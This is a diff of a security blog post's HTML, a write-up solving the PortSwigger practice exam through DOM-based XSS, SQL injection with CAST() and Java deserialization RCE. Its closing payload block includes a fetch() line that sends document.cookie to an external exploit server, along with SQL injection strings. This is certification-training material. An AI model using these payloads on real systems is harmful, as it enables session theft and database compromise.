@@ -1,104 +1,122 @@
 <!doctype html>
-<html lang="en-us"><head>
-    <title>incogbyte&#39;s blog</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<html lang="en-us">
+  <head>
+    <title>PortSwigger Practice Exam // incogbyte ⚔️ 🚩</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.142.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Rodolfo &#39;incogbyte&#39; Tavares" />
     <meta name="description" content="" />
-
-    
-    
-    
-    <link rel="stylesheet" href="../../css/theme.min.css">
-
-    
-    
+    <link rel="stylesheet" href="/css/main.min.3373d1880564393d6fdfebd581c3c0426fb8fec976a9d3ca81aaf15ef48012d3.css" />
     
 
     
-</head>
-<body>
-        <div id="content" class="mx-auto"><header class="container mt-sm-5 mt-4 mb-4 mt-xs-1">
-    <div class="row">
-        <div class="col-sm-4 col-12 text-sm-right text-center pt-sm-4">
-            <a href="../../" class="text-decoration-none">
-                <img id="home-image" class="rounded-circle"
-                    
-                        
-                            src="../../images/avatar.png"
-                        
-                    
-                />
-            </a>
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="PortSwigger Practice Exam">
+  <meta name="twitter:description" content="In this blog post, we’ll embark on a journey to dissect the solution to a challenging practice exam question provided by PortSwigger. We’ll delve deep into the intricacies of web security, emphasizing the critical importance of understanding vulnerabilities, exploitation techniques, and mitigation strategies. By the time you finish reading this article, you’ll have gained valuable insights into real-world web security scenarios, equipping yourself with the knowledge required to effectively protect digital assets.">
+
+    <meta property="og:url" content="https://incogbyte.github.io/posts/portswigger-practice-exam/">
+  <meta property="og:site_name" content="incogbyte ⚔️ 🚩">
+  <meta property="og:title" content="PortSwigger Practice Exam">
+  <meta property="og:description" content="In this blog post, we’ll embark on a journey to dissect the solution to a challenging practice exam question provided by PortSwigger. We’ll delve deep into the intricacies of web security, emphasizing the critical importance of understanding vulnerabilities, exploitation techniques, and mitigation strategies. By the time you finish reading this article, you’ll have gained valuable insights into real-world web security scenarios, equipping yourself with the knowledge required to effectively protect digital assets.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-01T17:12:34-03:00">
+    <meta property="article:modified_time" content="2023-12-01T17:12:34-03:00">
+    <meta property="article:tag" content="Writeup">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://incogbyte.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="Rodolfo &#39;incogbyte&#39; Tavares" /></a>
+      <span class="app-header-title">incogbyte ⚔️ 🚩</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/cve/">CVEs</a>
+      </nav>
+      <p>Just another bit inside the matrix. (Infosec/Dev/🕸️⚔)</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://x.com/incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-x">
+  <title>x</title>
+  <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+          </a>
+        
+          <a href="https://linkedin.com/in/rodolfo-tavares-543863a7" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
+  <title>linkedin</title>
+  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
+</svg>
+          </a>
+        
+          <a href="https://keybase.io/incogbyte/pgp_keys.asc" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-key">
+  <title>keybase</title>
+  <path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"></path>
+</svg>
+          </a>
+        
+          <a href="https://infosec.exchange/@incogbyte" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-link">
+  <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+  <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">PortSwigger Practice Exam</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Dec 1, 2023
         </div>
-        <div class="col-sm-8 col-12 text-sm-left text-center">
-            <h2 class="m-0 mb-2 mt-4">
-                <a href="../../" class="text-decoration-none">
-                    
-                        incogbyte
-                    
-                </a>
-            </h2>
-            <p class="text-muted mb-1">
-                
-                    incogbyte #:
-                
-            </p>
-            <ul id="nav-links" class="list-inline mb-2">
-                
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../about/" title="About">About</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../" title="Posts">Posts</a>
-                    </li>
-                
-                    <li class="list-inline-item">
-                        <a class="badge badge-white " href="../../cve/" title="CVEs">CVEs</a>
-                    </li>
-                
-            </ul>
-            <ul id="nav-social" class="list-inline">
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://github.com/incogbyte" target="_blank">
-                            <i class="fab fa-github fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://wwww.linkedin.com/in/rodolfo-augusto-543863a7" target="_blank">
-                            <i class="fab fa-linkedin-in fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="https://twitter.com/incogbyte" target="_blank">
-                            <i class="fab fa-twitter fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="mailto://incogbyte%40protonmail.com" target="_blank">
-                            <i class="fas fa-at fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-                    <li class="list-inline-item mr-3">
-                        <a href="incogbyte" target="_blank">
-                            <i class="fab fa-telegram fa-1x text-muted"></i>
-                        </a>
-                    </li>
-                
-            </ul>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          3 min read
         </div>
-    </div>
-    <hr />
-</header>
-<div class="container">
-    <div class="pl-sm-4 ml-sm-5">
-        <p>In this blog post, we&rsquo;ll embark on a journey to dissect the solution to a challenging practice exam question provided by PortSwigger. We&rsquo;ll delve deep into the intricacies of web security, emphasizing the critical importance of understanding vulnerabilities, exploitation techniques, and mitigation strategies. By the time you finish reading this article, you&rsquo;ll have gained valuable insights into real-world web security scenarios, equipping yourself with the knowledge required to effectively protect digital assets.</p>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://incogbyte.github.io/tags/writeup/">Writeup</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>In this blog post, we&rsquo;ll embark on a journey to dissect the solution to a challenging practice exam question provided by PortSwigger. We&rsquo;ll delve deep into the intricacies of web security, emphasizing the critical importance of understanding vulnerabilities, exploitation techniques, and mitigation strategies. By the time you finish reading this article, you&rsquo;ll have gained valuable insights into real-world web security scenarios, equipping yourself with the knowledge required to effectively protect digital assets.</p>
 <p>Before we begin, let&rsquo;s briefly introduce the PortSwigger practice exam. You can find more information about this exam <a href="https://portswigger.net/web-security/certification/practice-exam">here</a>.</p>
 <p>Here&rsquo;s an overview of what the practice exam entails:</p>
 <ul>
@@ -115,27 +133,27 @@
 <p>Now, let&rsquo;s delve into the details of each stage, exploring the challenges and solutions that await:</p>
 <h3 id="first-stage-finding-the-user">First Stage: Finding the User</h3>
 <p>The first stage presents a dom-based Cross-Site Scripting (XSS) challenge. However, there are restrictions in place that require creative bypass techniques. We&rsquo;ll walk you through the process of chaining payloads to successfully exploit the vulnerability and retrieve the user token.</p>
-<p><img src="../../images/dom_based_xss_p1.png" alt="XSS Challenge"></p>
+<p><img src="/images/dom_based_xss_p1.png" alt="XSS Challenge"></p>
 <p>The journey to finding the user token will involve a series of payload chains, as illustrated below:</p>
-<p><img src="../../images/xss_dom_based.png" alt="Payload Chain"></p>
-<p><img src="../../images/Chain_exploit_xss_dom_based.png" alt="Payload Chain2"></p>
+<p><img src="/images/xss_dom_based.png" alt="Payload Chain"></p>
+<p><img src="/images/Chain_exploit_xss_dom_based.png" alt="Payload Chain2"></p>
 <p>After numerous attempts and perseverance, you&rsquo;ll achieve the desired outcome:</p>
-<p><img src="../../images/exploit_server_xss_dom_based.png" alt="Exploit Success"></p>
-<p><img src="../../images/get_carlos_token.png" alt="Carlos token"></p>
-<p><img src="../../images/carlos_login_page.png" alt="Carlos Page"></p>
+<p><img src="/images/exploit_server_xss_dom_based.png" alt="Exploit Success"></p>
+<p><img src="/images/get_carlos_token.png" alt="Carlos token"></p>
+<p><img src="/images/carlos_login_page.png" alt="Carlos Page"></p>
 <h3 id="second-stage-sql-injection-and-admin-login">Second Stage: SQL Injection and Admin Login</h3>
 <p>The second stage may seem mundane but proves to be a critical test of your SQL injection skills. You&rsquo;ll need to utilize CAST() clauses to extract the admin password.</p>
 <p>To begin, you&rsquo;ll want to confirm the presence of an SQL error when manipulating the &lsquo;organize_by&rsquo; parameter:</p>
-<p><img src="../../images/sql1.png" alt="SQL Error"></p>
+<p><img src="/images/sql1.png" alt="SQL Error"></p>
 <p>With some persistence, you&rsquo;ll uncover valuable information:</p>
-<p><img src="../../images/sql2.png" alt="SQL Result"></p>
+<p><img src="/images/sql2.png" alt="SQL Result"></p>
 <p>You&rsquo;ll gather details such as the database version, user, and password:</p>
-<p><img src="../../images/version_sqli.png" alt="DB Details"></p>
-<p><img src="../../images/administrador_sqli.png" alt="User and Password"></p>
-<p><img src="../../images/password_admin_sqli.png" alt="Password"></p>
-<p><img src="../../images/admin_login_after_sqli.png" alt="Admin Login"></p>
+<p><img src="/images/version_sqli.png" alt="DB Details"></p>
+<p><img src="/images/administrador_sqli.png" alt="User and Password"></p>
+<p><img src="/images/password_admin_sqli.png" alt="Password"></p>
+<p><img src="/images/admin_login_after_sqli.png" alt="Admin Login"></p>
 <p>Delete user carlos :-)</p>
-<p><img src="../../images/delete_carlos_admin.png" alt="Admin Login"></p>
+<p><img src="/images/delete_carlos_admin.png" alt="Admin Login"></p>
 <p>Completing this stage, you&rsquo;ll have accomplished two major milestones:</p>
 <ol>
 <li>Successful SQL injection</li>
@@ -143,16 +161,16 @@
 </ol>
 <h3 id="third-stage-remote-code-execution-via-deserialization">Third Stage: Remote Code Execution via Deserialization</h3>
 <p>In the final stage, you&rsquo;ll log in as the admin and inspect the cookies, specifically looking for a cookie named &lsquo;admin&rsquo; with a known pattern &lsquo;H4sIAAAAAAAAA.&rsquo; This pattern typically signifies a serialized Java string:</p>
-<p><img src="../../images/pyl.png" alt="Payload Generation"></p>
+<p><img src="/images/pyl.png" alt="Payload Generation"></p>
 <p>To achieve Remote Code Execution (RCE) via deserialization, you&rsquo;ll need a tool like <a href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a>. Following the guidance provided in <a href="https://book.hacktricks.xyz/pentesting-web/deserialization">Hack Tricks</a>, you&rsquo;ll generate a payload.</p>
 <p>Here&rsquo;s a simplified example of a Java URLDNS payload:</p>
-<p><img src="../../images/deser_payload_gen.png" alt="Payload Generation"></p>
+<p><img src="/images/deser_payload_gen.png" alt="Payload Generation"></p>
 <p>Upon successful payload execution, you&rsquo;ll receive a callback:</p>
-<p><img src="../../images/deser_payload_result.png" alt="Payload Result"></p>
+<p><img src="/images/deser_payload_result.png" alt="Payload Result"></p>
 <p>Next, you&rsquo;ll generate a payload to retrieve the contents of &lsquo;/home/carlos/secret&rsquo;:</p>
-<p><img src="../../images/exploit_payload_deser.png" alt="Exploit Payload"></p>
+<p><img src="/images/exploit_payload_deser.png" alt="Exploit Payload"></p>
 <p>And here&rsquo;s the resulting data:</p>
-<p><img src="../../images/exploit_payload_deser_result.png" alt="Exploit Payload Result"></p>
+<p><img src="/images/exploit_payload_deser_result.png" alt="Exploit Payload Result"></p>
 <p>With this, you&rsquo;ve achieved Remote Code Execution, completing the third stage and ultimately conquering the PortSwigger practice exam.</p>
 <p>To further assist you in your web security endeavors, i&rsquo;ve included some useful payload references and commands below:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>fetch(`https://exploit-0ad000380440d0c28074023d010f00c1.exploit-server.net/exploit/?cookie=` + window[&#34;document&#34;][&#34;cookie&#34;])
@@ -176,17 +194,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">true</span><span style="color:#f92672">+</span><span style="color:#66d9ef">and</span><span style="color:#f92672">+</span><span style="color:#66d9ef">cast</span>((<span style="color:#66d9ef">select</span><span style="color:#f92672">+</span>password<span style="color:#f92672">+</span><span style="color:#66d9ef">from</span><span style="color:#f92672">+</span>users<span style="color:#f92672">+</span><span style="color:#66d9ef">limit</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>)<span style="color:#66d9ef">as</span><span style="color:#f92672">+</span>boolean)
 </span></span></code></pre></div>
     </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
 
-    
-
-            </div>
-        </div><footer class="text-center pb-1">
-    <small class="text-muted">
-        
-            &copy; Copyright 2025, incogbyte
-        
-        <br>
-    </small>
-</footer>
-</body>
+    </main>
+  </body>
 </html>
